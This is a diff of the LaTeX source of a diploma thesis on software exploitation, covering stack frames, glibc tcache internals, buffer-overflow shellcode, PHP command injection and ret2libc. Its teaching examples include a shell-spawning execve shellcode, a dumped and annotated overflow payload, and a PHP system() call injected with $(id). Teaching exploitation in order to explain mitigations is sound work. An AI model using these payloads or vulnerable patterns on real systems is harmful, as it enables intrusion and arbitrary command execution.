@@ -7,13 +7,14 @@
 \usepackage{xstring}
 \usepackage{listings}
 \usepackage{xcolor}
-\usepackage[margin=2.54cm]{geometry}
 \usepackage[utf8]{inputenc}
+\usepackage{csquotes}
 \usepackage[english]{babel}
 \usepackage{float}
 \usepackage[toc,page]{appendix}
 
 \usepackage[backend=biber,style=numeric]{biblatex}
+\nocite{*}
 
 \addbibresource{references.bib} % Import the bibliography file
 
@@ -28,19 +29,138 @@
     breaklines=true
 }
 
+
+\makeatletter
+
+\newcommand{\advisor}[1]{\def\@advisor{#1}}
+\newcommand{\university}[1]{\def\@university{#1}}
+\newcommand{\universityRO}[1]{\def\@universityRO{#1}}
+\newcommand{\faculty}[1]{\def\@faculty{#1}}
+\newcommand{\facultyRO}[1]{\def\@facultyRO{#1}}
+\newcommand{\department}[1]{\def\@department{#1}}
+\newcommand{\departmentRO}[1]{\def\@departmentRO{#1}}
+\newcommand{\email}[1]{\def\@email{#1}}
+\newcommand{\location}[1]{\def\@location{#1}}
+\newcommand{\locationRO}[1]{\def\@locationRO{#1}}
+\newcommand{\titleRO}[1]{\def\@titleRO{#1}}
+
+\newcommand{\mi}[1]{\mathit{#1}}
+
+\renewcommand{\maketitle}{
+\begin{titlepage}
+    \begin{center}
+        {\LARGE \@university\\\@faculty\\\@department}
+    
+        \vspace{3em}
+    
+        \begin{tabular}{p{4cm}p{5.0cm}}
+            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
+        \end{tabular}
+    
+        \vspace{4em}
+    
+        {\Huge DIPLOMA PROJECT}
+    
+        \vspace{3em}
+        
+        {\Large \@title}
+    
+        \vspace{2em}
+        
+        {\Large \@author}
+
+        {\normalsize \@email}
+    \end{center}
+
+    \vspace{6em}
+
+
+    \begin{flushright}
+        {\large \textbf{Thesis advisor:}\vspace{1em}\\\@advisor}
+    \end{flushright}
+
+    \vspace{5em}
+
+    \begin{center}
+        {\Large \textbf{\@location}}
+    
+        {\large \@date}
+    \end{center}
+    \newpage
+\end{titlepage}
+\begin{titlepage}
+    \begin{center}
+        {\LARGE \@universityRO\\\@facultyRO\\\@departmentRO}
+    
+        \vspace{3em}
+    
+        \begin{tabular}{p{4cm}p{5.0cm}}
+            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
+        \end{tabular}
+    
+        \vspace{4em}
+    
+        {\Huge PROIECT DE DIPLOMĂ}
+    
+        \vspace{3em}
+        
+        {\Large \@titleRO}
+    
+        \vspace{2em}
+        
+        {\Large \@author}
+
+        {\normalsize \@email}
+    \end{center}
+
+    \vspace{6em}
+
+
+    \begin{flushright}
+        {\large \textbf{Coordonator științific:}\vspace{1em}\\\@advisor}
+    \end{flushright}
+
+    \vspace{5em}
+
+    \begin{center}
+        {\Large \textbf{\@locationRO}}
+    
+        {\large \@date}
+    \end{center}
+    \newpage
+\end{titlepage}
+}
+\makeatother
+
+\university{University Politehnica of Bucharest}
+\universityRO{Universitatea Politehnica din București}
+\faculty{Automatic Control and Computer Science}
+\facultyRO{Facultatea de Automatică și Calculatoare}
+\department{Computer Science and Engineering Department}
+\departmentRO{Departamentul de Calculatoare}
+\title{Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
+\titleRO{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern}
+\author{Bud Liviu-Alexandru}
+\email{budliviu@gmail.com}
+\advisor{As.Ing. Ştefan-Dan CIOCÎRLAN}
+\location{Bucharest}
+\locationRO{București}
+\date{2023}
+
 \begin{document}
 
-\title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
 \maketitle
+% \title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
+% \maketitle
 
 \tableofcontents
 
 \section{Abstract}%
 
-Software exploitation continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks. The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem. This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, from static and dynamic analysis techniques to machine learning and artificial intelligence-based approaches, critically evaluating their strengths and weaknesses. Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle. In conclusion, this paper aims to offer an in-depth review of the current landscape of exploitation, detection and mitigation methodologies and techniques, emphasizing the criticality of these techniques in fortifying software against threats.
+\emph{Software exploitation} continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks. The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem. This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, critically evaluating their strengths and weaknesses. Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle. In conclusion, this paper aims to offer an in-depth review of the current landscape of exploitation, detection and mitigation methodologies and techniques, emphasizing the criticality of these techniques in fortifying software against threats.
 
 \section{Motivation}%
-The ubiquity of digital devices in our daily lives has ushered in an era of unprecedented data accessibility and convenience. Yet, these conveniences also come with substantial security concerns. A significant proportion of the world's population carries a device in their pocket that is not only a communication device but also a gateway to their most personal and sensitive information, including bank accounts, biometrics, and other data of significant value. These devices, armed with cameras and microphones, could potentially be misused to impersonate their owners. With these threats looming, the importance of rigorous and effective exploit mitigation strategies, especially in system's programming, cannot be overstated. These mitigation strategies form the critical defensive layer that shields users from the consequences of potential security breaches, preventing unauthorized access, and securing the private sphere of individuals in the digital age. Hence, the motivation of this study is to evaluate, analyze, and enhance the robustness of these mitigation strategies, thereby contributing to safer and more secure software systems.
+Digital devices have made data access and ease unprecedented. However, these conveniences raise serious security issues. A large section of the world's population carries a device in their pocket that can access their bank accounts, fingerprints, and other valuable data. These devices may imitate their owners using cameras and microphones. Exploit mitigation measures, especially in system development, are crucial with these risks. These mitigation measures protect consumers from security breaches and secure their digital privacy. This study evaluates, analyzes, and improves various mitigation measures to make software systems safer and more secure.
 
 \section{Background}%
 
@@ -69,7 +189,7 @@ Recent years have witnessed an uptick in supply chain attacks, increasingly prop
 In~\cite{LunaSec}, the authors discuss methods of preventing these kinds of attacks in the future. The one that is the most interesting to us \emph{Dependency Sandboxes}. This strategy would limit the capabilities of software packages to the minimum they require to function. It would allow for a more streamlined auditing pipeline by focusing the audits on packages with destructive capabilities, such as system-wide file access.
 
 \subsection{Mixing control data with user data}
-The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture. The stack is typically organized as a contiguous memory region with two key pointers: the stack base pointer (RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in memory, meaning that as new items are pushed onto the stack, the stack pointer decreases in value. A typical function call on an x64 system involves pushing the return address onto the stack, followed by the function's parameters \footnote{In the most common calling convention, the first few parameters are passed in registers, not through the stack}, and finally, the local variables. These elements are popped from the stack in reverse order upon function return, ensuring correct program execution. However, the direct memory access afforded by the stack also presents a potential vector for exploitation, with techniques such as buffer overflow attacks targeting this fundamental structure. Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems.
+The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture. The stack is typically organized as a contiguous memory region with two key pointers: the stack base pointer (RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in memory, meaning that as new items are pushed onto the stack, the stack pointer decreases in value. A typical function call on an x64 system involves pushing the return address onto the stack, followed by the function's parameters \footnote{In the most common calling convention, the first few parameters are passed in registers, not through the stack}, and finally, the local variables. These elements are popped from the stack in reverse order upon function return, ensuring correct program execution. However, the direct memory access afforded by the stack also presents a potential vector for exploitation, with techniques such as buffer overflow attacks targeting this fundamental structure. Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems. The exploitation and proof of exploitability due to memory corruption have been formalized in~\cite{WeirdMachines}.
 
 \begin{figure}[H]%
   \centering
@@ -126,9 +246,9 @@ The stack is a fundamental data structure in modern computing systems, and its u
   }
 \end{lstlisting}%
 
-An example state of the stack during the call~\footnote{This example is used for simplicity. In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.
+An example state of the stack during the call\footnote{This example is used for simplicity. In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.
 
-We can see that the stack frame contains some interesting values that we haven't defined ourselves:
+The stack frame contains some interesting values that were not declared in code:
 \begin{itemize}
   \item \textbf{RBP} -~Base pointer. This has been historically used to keep
         track of the start (or base) of our function's stack frame. Functions are usually not allowed to modify values above this address.
@@ -194,13 +314,13 @@ We can see that the stack frame contains some interesting values that we haven't
   \caption{\label{fig:stacksample} Stack state when executing 3 nested calls}%
 \end{figure}
 
-Now that we understand how a stack frame looks, we can move on to how stack frames are linked together. Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
+Taking into account the layout of a stack frame, this is how stack frames are linked together when calling nested functions. Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
 
 \begin{equation}
   foo \Rightarrow bar \Rightarrow baz \Rightarrow qux
 \end{equation}
 
-This structure is a singly linked list of stack frames, with \emph{RBP} as their forward pointer. The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail. Because user variables are mixed with control structures, we can imagine the outcome if we managed to corrupt the \emph{forward} pointer in this linked list.
+This structure is a singly linked list of stack frames, with \emph{RBP} as their forward pointer. The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail. Because user variables are mixed with control structures, corrupting the \emph{forward} pointer could lead to crashes or even exploits.
 
 On the \emph{x86-64} platform, returning from a function can be usually abstracted to this algorithm:
 \begin{enumerate}
@@ -226,18 +346,18 @@ Although there are more functions that interact with the system Heap this paper 
 The C standard~\cite[p.~154-157]{ANSI_C} strictly defines the behavior of malloc and free. Upon successful execution, malloc provides a block of memory suitably aligned for any variable. The allocated memory is uninitialized, meaning it contains indeterminate values. If the function fails to allocate the requested memory, perhaps due to insufficient memory space, it returns a NULL pointer. Notably, the standard guarantees that malloc will not modify the allocated memory's content, differentiating it from similar functions like calloc, which sets the allocated memory to zero. The pointer returned by malloc is always a unique address not being used elsewhere in the program until it is freed by the \emph{free} function.
 
 \subsubsection{free}
-The \emph{free} function pretty much does the inverse of what malloc does. It marks the memory allocation starting at the address given as a parameter as free for use by the allocator. The algorithm behind the dynamic memory allocation API is left to be implementation-defined. We will dig deeper into the allocator used by LibC on the GNU/Linux operating system.
+The \emph{free} function pretty much does the inverse of what malloc does. It marks the memory allocation starting at the address given as a parameter as free for use by the allocator. The algorithm behind the dynamic memory allocation API is left to be implementation-defined.
 
 \subsection{Allocating memory in Linux}
-The allocator used by the C standard library (GLibC) on Linux is a variation of \emph{ptmalloc}. There are two main ways to allocate memory using this allocator. The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{We will be referring to allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
+The allocator used by the C standard library (GLibC) on Linux is a variation of \emph{ptmalloc}. There are two main ways to allocate memory using this allocator. The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{Allocations with a size $<$ {M\_MMAP\_THRESHOLD} aare\emph{small} and allocations larger than that are \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
 \begin{itemize}
   \item \emph{small}~-~served by the allocation algorithm
   \item \emph{large}~-~served by a call to \emph{mmap}
 \end{itemize}
 
-Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us. We will discuss this algorithm in detail, highlighting areas of interest that will help us develop exploits and mitigations later.
+Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us. This algorithm will be discussed in detail, highlighting areas of interest helpful for exploit and mitigation development.
 
-The allocation algorithm is described in depth in~\cite{MallocInternals}. We will mainly be exploring the \emph{tcache} part of the algorithm.
+For futher reading, the allocation algorithm is described in depth in~\cite{MallocInternals}.
 
 Definitions:
 \begin{itemize}
@@ -301,7 +421,7 @@ considerations and could occur during a \texttt{malloc} or another call.
 \subsubsection{tcache}
 Here is a more in-depth analysis of the \emph{tcache} functionality. This feature was introduced in GLibC in order to speed up the allocation of small, short-lived objects from multiple threads simultaneously. This part of the algorithm is the only one that is thread-local, the others requiring a lock on the process' Arena or atomic operations.
 
-\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named tcache buckets. Each bucket can store a range of allocation sizes. When calling \emph{malloc} with tcache enabled, the first step is to check the appropriately sized tcache bucket for an allocation that might satisfy our requirements. If an allocation is found, it is removed from the singly linked list and returned.
+\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named ``tcache buckets''. Each bucket can store a range of allocation sizes. When calling \emph{malloc} with tcache enabled, the first step is to check the appropriately sized tcache bucket for an allocation that might satisfy our requirements. If an allocation is found, it is removed from the singly linked list and returned.
 
 \begin{figure}[ht]%
   \centering
@@ -353,7 +473,7 @@ The example in Figure~\ref{fig:tcache} is a sample tcache state after executing 
   \item $free(alloc_{0})$
   \item $free(alloc_{1})$
 \end{enumerate}
-Let's say we want to make an allocation that would fit inside $bucket_{0}$. The tcache algorithm would pull out that allocation from the list and return it to us, while updating the head of the list with the address of $alloc_{0}$.
+Assume that an allocation that would fit inside $bucket_{0}$ is made. The tcache algorithm would talke out that allocation from the list and return it to the program, while updating the head of the list with the address of $alloc_{0}$.
 
 \begin{figure}[ht]%
   \centering
@@ -386,7 +506,7 @@ Let's say we want to make an allocation that would fit inside $bucket_{0}$. The 
     \draw[->] (m3-1-1) -- (m2-1-1);
     \draw[->] (m3-1-3) -- (m2-1-3);
   \end{tikzpicture}
-  \caption{\label{fig:tcache} Sample tcache state after malloc}%
+  \caption{\label{fig:tcache2} Sample tcache state after malloc}%
 \end{figure}
 
 How does \emph{tcache} store the links between the allocations?
@@ -453,7 +573,7 @@ Typical forms of corruption are managed via calls to \texttt{malloc\_printerr}; 
 % exploitation landscape.
 
 \section{Software Exploitation Techniques}%
-Software exploitation has been a prevalent issue almost as early as the inception of software itself, underpinning the need for constant vigilance and innovation in software security. Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm. Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable \cite{spafford1989internet}. Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses \cite{owasp2017}. The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems. This dynamic continues to define the software security landscape today.
+Software exploitation has been a prevalent issue almost as early as the inception of software itself, underpinning the need for constant vigilance and innovation in software security. Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm. Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable. Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses . The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems. This dynamic continues to define the software security landscape today.
 
 \subsection{Early stage}
 \subsubsection{Shellcoding}
@@ -461,9 +581,9 @@ Software exploitation has been a prevalent issue almost as early as the inceptio
   shellcoding
   reference smashing the stack for fun and profit
 \end{comment}
-One of the earliest vulnerabilities that were exploited was the buffer overflow. A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection. This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code. One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{one1996smashing}. This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.
+One of the earliest vulnerabilities that were exploited was the buffer overflow. A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection. This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations. If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code. One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{alephone}. This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.
 
-Below \ref{lst:bof} is an example of a vulnerable program.
+Code for the vulnerable program used is available at Annex~\ref{lst:bof-sample}.
 
 Running the program with my name gives an expected output:
 \begin{lstlisting}[caption={Non-malicious input}
@@ -473,7 +593,7 @@ $ ./say_hi Liviu
 Hi Liviu!
 \end{lstlisting}
 
-But running the program with the following malicious crafted input we get a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled by default. The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
+But running the program with the following malicious crafted input a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled is displayed. The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
 \begin{lstlisting}[caption={Shellcode execution}
       ,label={lst:bof_malicious}
       ,language=bash]
@@ -500,16 +620,16 @@ Makefile  say_hi  shellcode_malicious_input.bin
 0000340 d231 3b6a 0f58 0005
 0000347
 \end{lstlisting}
-Our simple program behaves like a system shell. We will now analyze what happened during the execution of our program. Here,~\ref {lst:bof_malicous_hex} is a hex dump of the input. Let us break it down:
+The program behaves like a system shell. Listing ~\ref{lst:bof_malicous_hex} shows the payload used in \emph{hexdump} form. 
 \begin{enumerate}
-  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are allowed to do this because \emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though strings in C are almost always NULL terminated.~\emph{scanf} will only return when it encounters an error or reads a line ending}. We do this in order to fill up the buffer that the application uses. These values could be anything (besides line endings).
-  \item As shown in\ref{veziacistackuala} we now need to overflow the \emph{base pointer}. This exploitation scenario allows us to place any value instead of the saved rbp (because it is not used), but it can allow us to pivot the stack into some memory address we know in some cases.
-  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
-  \item After the return address, we place a \emph{nop sled}. The purpose of the nop sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack, the addresses the stack register and instruction pointer point to are close together. Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
-  \item Finally, we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running process with the \emph{sh} shell process.
+  \item \texttt{0000000-0000100} null bytes\footnote{\emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though C strings NULL terminated.~\emph{scanf} will stop consuming input only when it encounters an error or a line break}.
+  \item \texttt{0000100-0000108} overflowed \emph{base pointer} This exact exploitation scenario does not impose any restrictions on the overflowed value of the base pointer.
+  \item \texttt{0000108-0000110} overflowed \emph{return address}, now containing the address of the \emph{jump rsp} gadget
+  \item \texttt{0000110-0000310} \emph{nop sled}, giving the attacker leeway when choosing the return address.
+  \item \texttt{0000110-0000310} shellcode at Listing ~\ref{lst:bofshell} calling the \emph{execve} function with the arguments: ``/bin/sh"", NULL, NULL, granting the attacker a shell on the system
 \end{enumerate}
 
-This traditional exploitation technique of buffer overflow into shellcode has been effectively mitigated by a plethora of defensive mechanisms that we will discuss in subsequent chapters, such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), Stack Canaries, Control-Flow Integrity (CFI). Despite these advancements, the described exploitation scenarios retain relevance in contexts where these protection measures are absent or cannot be implemented. For example, systems lacking a Memory Management Unit (MMU), many embedded systems, and specific router configurations may not have these defenses, leaving them susceptible to such attacks. Thus, understanding these exploits remains critical in a comprehensive approach to system security.
+This traditional exploitation technique of buffer overflow to shellcode has been effectively mitigated by a multitude of defensive mechanisms, which will be discussed in subsequent chapters. These mechanisms include \emph{Address Space Layout Randomization} (ASLR), \emph{Data Execution Prevention} (DEP), \emph{Stack Canaries}, and \emph{Control-Flow Integrity} (CFI). Despite these developments, the exploitative scenarios that were outlined are still applicable in settings in which the protective mechanisms stated above are either not present or cannot be adopted. For example, systems that do not have a \emph{Memory Management Unit} (MMU), a large number of embedded systems, and some router configurations may lack these safeguards, leaving them susceptible to assaults of this kind. It is still essential for a complete system security plan to have a solid understanding of these attacks.
 
 \begin{figure}[ht]%
   \centering
@@ -563,12 +683,11 @@ This traditional exploitation technique of buffer overflow into shellcode has be
   %     node[midway,xshift=1.5cm,] {Group 1};
 
   \end{tikzpicture}
-  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
-  \label{fig:stackframe}
+  \caption{\label{fig:stackframe} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
 \end{figure}
 
 \begin{lstlisting}[caption={Shellcode disassembly}
-      ,label={lst:bof}
+      ,label={lst:bofshell}
       ,language={[x86masm]Assembler}]
     /* execve(path='/bin///sh', argv=['sh'], envp=0) */
     /* push b'/bin///sh\x00' */
@@ -595,13 +714,16 @@ This traditional exploitation technique of buffer overflow into shellcode has be
 \end{lstlisting}
 
 \subsubsection{Command injection}
-Command injection vulnerabilities represent a pervasive class of security issues impacting web and system programming environments. These vulnerabilities occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing the attacker to execute arbitrary commands on the host operating system. In web applications, these flaws are primarily found in scripts that fail to properly sanitize user input, making them susceptible to cross-site scripting (XSS) and SQL injection attacks. However, command injection vulnerabilities are not confined to web programming; they are equally prevalent in systems programming. Poorly designed system applications and scripts that accept untrusted input for command execution can expose the system to similar attacks. This vulnerability, thus, underlines the importance of careful data handling and proper input validation, irrespective of the programming environment.
+Command injection vulnerabilities are pervasive in web and system programming environments. These flaws occur when an application passes unsecure user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing an attacker to execute arbitrary commands on the host operating system.
 
-We will be walking through the following\ref{veziphpbapula} vulnerable PHP app. The application lacks proper input validation and allows an attacker to execute arbitrary commands. The use of the \emph{system} function will cause the following process to execute \texttt{sh -c ``echo Hello <username>''}\footnote{There are situations where we are not able to inject parameters into a command that will be directly reflected in the page. In these situations, we can try to end the intended command by using a \emph{;} character and then write our malicious command after.}. Our\ref{poggeroni} malicious request sets the \emph{username} parameter to \verb|$(id)|. Because the original command executes in a shell environment, the shell will interpret this string by forking itself, executing the string between the braces, and replacing the original string with the result of the command. We can imagine that we can cause havoc on the vulnerable machine by being able to execute any command we want.
+\emph{Cross-site scripting} (XSS) and \emph{SQL injection} vulnerabilities are most prevalent in web applications with scripts that fail to properly sanitize user input, making them susceptible to such attacks.
+However, command injection vulnerabilities are prevalent in systems programming as well as web programming. Applications and programs that accept untrusted input for command execution and are poorly designed can expose the system to similar attacks. This vulnerability highlights the significance of careful data management and input validation regardless of the programming environment.
+
+Such an example of a vulnerable app is shown in Listing~\ref{lst:phpinject}. The application lacks proper input validation and allows an attacker to execute arbitrary commands due to use of the \emph{system} function. The malicious request at Listing~\ref{lst:cmdinj} sets the \emph{username} parameter to \verb|$(id)|, causing the system shell called by the \emph{system} PHP function to interpret the username as a subcommand, interpolating the output into the original command.
 
 \begin{minipage}{\linewidth}
 \begin{lstlisting}[caption={Command Injection example}
-      ,label={lst:bof}
+      ,label={lst:phpinject}
       ,language=PHP]
 <?php
     $username = $_GET['username'];
@@ -611,7 +733,7 @@ We will be walking through the following\ref{veziphpbapula} vulnerable PHP app. 
 \end{minipage}
 
 \begin{lstlisting}[caption={Command Injection example}
-      ,label={lst:bof}
+      ,label={lst:cmdinj}
       ,language=bash]
 $ docker run -d -p 8080:80 command_injection_php
 d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
@@ -621,23 +743,24 @@ Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
 Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.
 
 The situation is similar in the systems programming space. The example of how a vulnerable program might look is left as an exercise for the reader.
+
 \subsection{Evolution}
-\begin{comment} ret2libc
-  Mention the lack of mitigation
-  Rise of heap based exploits due to browsers and JS
-  Research some linux&windows kernel exploits
-\end{comment}
-As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication. In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses. Return Oriented Programming (ROP) and heap corruption exploits are prominent among these. ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the NX bit. On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges. This evolutionary process underscores the dynamic nature of the cybersecurity landscape and the perpetual challenge of maintaining software security in the face of evolving threats.
+As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication. In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses. \emph{Return Oriented Programming} (ROP) and heap corruption exploits are prominent among these. ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the \emph{NX} bit. 
+
+On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges. This evolutionary process underscores the dynamic nature of the cybersecurity landscape and the perpetual challenge of maintaining software security in the face of evolving threats.
 
 \subsubsection{ret2libc}
 \emph{ret2libc} or \emph{Return to LibC} is a countermove against the NX bit mitigation, which marks certain areas of memory as non-executable, thereby prohibiting the execution of injected code. The essence of ret2libc lies in its ingenious manipulation of the program's control flow to call existing code, typically functions residing in standard libraries (hence 'libc'), rather than introducing new code to be executed. By returning to standard, broadly-used functions like 'system()' or 'exec()', an attacker can execute arbitrary commands in the context of the vulnerable program, effectively bypassing the NX bit defense. Ret2libc exemplifies the continually evolving landscape of software exploitation techniques that repurposes legitimate elements of the program to nefarious ends, circumventing protective mechanisms and illustrating the challenges of developing robust and enduring defenses against software vulnerabilities.
 
-The entry mechanism behind this technique is the same as in the code injection case. We overwrite the return address of the program with an address we control. However, this time instead of providing our shellcode, we use existing code mapped inside the address space of the vulnerable process (usually from within the binary itself or LibC\footnote{LibC is mapped in almost all processes running on a system}).
+The entry mechanism behind this technique is the same as in the code injection case. The return address is overwritten with an attacker controlled address. However, this time instead of providing our shellcode, use existing code is made that is mapped inside the address space of the vulnerable process, in this case from LibC itself.
 
-For example, we could overwrite the return address of a function with the address of the \emph{system} function. When implementing this kind of attack, we face two difficult problems:
+
+For example, The return address of a function can be overwritten with the address of the \emph{system} function.
+
+Executing a ret2libc attack imposes two main challenges on the attacker:
 \begin{enumerate}
-  \item What is the address of the function we want to call?
-  \item How can we control the parameters that we pass to the function?
+  \item at what address are important functions such as \emph{system} located?
+  \item what mechanisms does the binary provide to pass parameters to functions that it did not call originally?
 \end{enumerate}
 
 \begin{figure}[ht]%
@@ -684,19 +807,19 @@ For example, we could overwrite the return address of a function with the addres
   \caption{\label{fig:vmmap} Virtual memory map}%
 \end{figure}
 
-We will assume we have identified an exploitable buffer overflow and a way to leak a known arbitrary address within LibC. Now we want to call the \emph{system} function with the `sh' string to grant us a foothold on the machine. In Figure~\ref{fig:vmmap} is an example of how the virtual memory space looks when executing a binary. The \emph{system} function is located in the text section\footnote{Briefly explain sections} of LibC. If LibC is compiled with PIC and ASLR is enabled on the target system, sections will be offset relative to a randomly selected base address. Using the information disclosure vulnerability to leak an address\footnote{Libc meme}, we can compute the base address of the library and, from there, get addresses for any byte in the library.
+The following exploitation steps assume that a function vulnerable to a buffer overflow is available and a known address from within LibC is known. The next step of this exploit is to call the \emph{system} function with `/bin/sh' as it's argument to grant us a foothold on the machine. In Figure~\ref{fig:vmmap} is an example of how the virtual memory space is laid out when executing a binary. The \emph{system} function is located within the text section of LibC. If LibC is compiled with \emph{PIC} and \emph{ASLR} is enabled on the target system, sections will be offset relative to a randomly selected base address. Using the known address it is possible to compute the base address of the library and, from there, get addresses for any byte in the library.
 
-Assuming managed to leak the address of the \emph{printf} function and have the exact LibC binary running on the system. We can get the base address at which the library is mapped using this formula:
